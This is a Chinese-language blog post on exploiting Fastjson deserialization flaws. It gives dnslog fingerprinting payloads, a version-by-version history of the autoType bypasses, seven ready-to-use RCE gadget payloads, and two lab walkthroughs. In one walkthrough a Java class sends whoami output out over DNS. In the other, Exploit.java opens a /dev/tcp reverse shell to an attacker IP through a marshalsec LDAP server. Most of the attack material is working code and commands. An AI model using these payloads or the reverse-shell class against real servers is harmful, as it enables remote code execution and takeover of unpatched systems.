---
title: 漏洞复现-Fastjson全方位利用
tags: 
  - 漏洞复现
  - Fastjson
  - 反序列化
  - 反弹shell
  - 命令执行
categories: 漏洞复现
keywords: '漏洞复现,Fastjson,反序列化,反弹shell,命令执行'
description: 漏洞复现-Fastjson全方位利用
cover: https://img1.baidu.com/it/u=4236482212,3196079296&fm=26&fmt=auto&gp=0.jpg
date: 2021-06-08 10:45:41
---



FastJson为什么经常爆出安全漏洞？
罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。
如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。

# 概念
fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。	
FastJson特点如下：
>（1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。	
（2）顾名思义，FastJson操作JSON的速度是非常快的。	
（3）无其他包的依赖。	
（4）使用比较方便。	

# Fastjson指纹特征及判别方法
## 根据返回包判断
任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。

## Dnslog盲打
```
{"rand1":{"@type":"java.net.InetAddress","val":"dnslog网址"}}
{"rand2":{"@type":"java.net.Inet4Address","val":"dnslog网址"}}
{"rand3":{"@type":"java.net.Inet6Address","val":"dnslog网址"}}
{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog网址"}}}
{"rand5":{"@type":"java.net.URL","val":"dnslog网址"}}
```
```
一些畸形payload，不过依然可以触发dnslog：
{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog网址"}}""}}
{"rand7":Set[{"@type":"java.net.URL","val":"dnslog网址"}]}
{"rand8":Set[{"@type":"java.net.URL","val":"dnslog网址"}
{"rand9":{"@type":"java.net.URL","val":"dnslog网址"}:0
```
# Fastjson历史漏洞
## ver<=1.2.24
1.2.24及之前没有任何防御，并且autotype默认开启。
## ver>=1.2.25&ver<=1.2.41
从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。
## ver=1.2.42
在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。
## ver=1.2.43
在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，\[也被特殊处理了，又再次绕过了checkAutoType。
## ver=1.2.44
修复了1.2.43的绕过，处理了\[。删除了之前的L开头、;结尾、LL开头的判断，改成了\[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。
## ver>=1.2.45&ver<1.2.46
这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。
## ver=1.2.47
这个版本发生了不开启autotype情况下能利用成功的绕过。
解析一下这次的绕过：

利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过	
这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中	
如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回	
## ver>=1.2.48&ver<=1.2.68
在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类
## ver=1.2.68
1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。

# 一些RCE Payload
```
payload1:
{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}
```
```
payload2:
{
  "rand1": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [
      "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
    ],
    "_name": "aaa",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```
```
payload3:
{
  "rand1": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://localhost:1389/Object"
    }
  }
}
```
```
payload4:
{
  "rand1": {
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://localhost:1389/Object",
    "propertyPath": "foo",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/Object"
      ]
    }
  }
}
```
```
payload5:
{
  "rand1": Set[
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/obj"
      ]
    },
    "adviceBeanName": "ldap://localhost:1389/obj"
  },
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
  }
]}
```
```
payload6:
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"
  }
}
```
```
payload7:
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://localhost:1389/Object",
    "loginTimeout": 0
  }
}
```
# 实战渗透测试

## Fastjson<1.2.24远程代码执行
1、使用docker搭建环境
![upload successful](/images/15/1.png) 

2、访问IP:8090显示此页面表示搭建成功
![upload successful](/images/15/2.png) 

3、攻击机中dnslog.java文件，内容如下：
```
import java.lang.Runtime;

import java.lang.Process;

public class dnslog{

    static {

        try {

            Runtime rt = Runtime.getRuntime();

            String[] commands = { "/bin/sh", "-c", "ping user.`whoami`.dnslog地址"};

            Process pc = rt.exec(commands);

            pc.waitFor();

        } catch (Exception e) {

            // do nothing

        }

    }

}
```

4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。
![upload successful](/images/15/3.png) 

5、将两个文件通过python3 -m http.server命令放到外网环境中
![upload successful](/images/15/4.png) 
![upload successful](/images/15/5.png) 

6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class
![upload successful](/images/15/6.png)

```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec/
编译项目
mvn clean package -DskipTests
```

成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件
![upload successful](/images/15/7.png) 

7、在当前主机通过生成的marshalsec文件运行rmi服务
```
cd target/
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.229.158:4455/#dnslog" 9999
```
![upload successful](/images/15/8.png) 

7、在漏洞页面bp抓包后post提交数据，替换如下payload：
```
Accept:*/*
Content-Type: application/json

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.229.158:9999/dnslog",
        "autoCommit":true
}
}
```
![upload successful](/images/15/9.png)

8、在dnslog可以看到回显了whoami的结果为root
![upload successful](/images/15/10.png) 

## Fastjson<1.2.48远程代码执行漏洞
1、首先使用docker搭建环境
![upload successful](/images/15/11.png) 

2、访问8090端口显示页面表示搭建成功
![upload successful](/images/15/12.png) 

3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。
```
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
public class Exploit{
    public Exploit() throws Exception {

        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.4.187/4554;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        InputStream is = p.getInputStream();

        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }
    public static void main(String[] args) throws Exception {

    }

}
```
4、使用javac命令编译Exploit.java文件，得到Exploit.class文件
![upload successful](/images/15/13.png)  
5、将两个文件通过python3 -m http.server命令放到外网环境中
![upload successful](/images/15/14.png)  
![upload successful](/images/15/15.png) 

6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666
```
![upload successful](/images/15/16.png)

7、客户端开启监听，这里我使用windows的nc进行监听
![upload successful](/images/15/17.png)

8、抓取数据包，更换传参方式为post，放入payload：
```
Accept: */*
Content-Type: application/json

{
    "name":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "x":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://192.168.229.158:6666/Exploit",
        "autoCommit":true
    }
}
```
![upload successful](/images/15/18.png) 

9、查看监听，已经成功获取了服务器的shell
![upload successful](/images/15/19.png)  
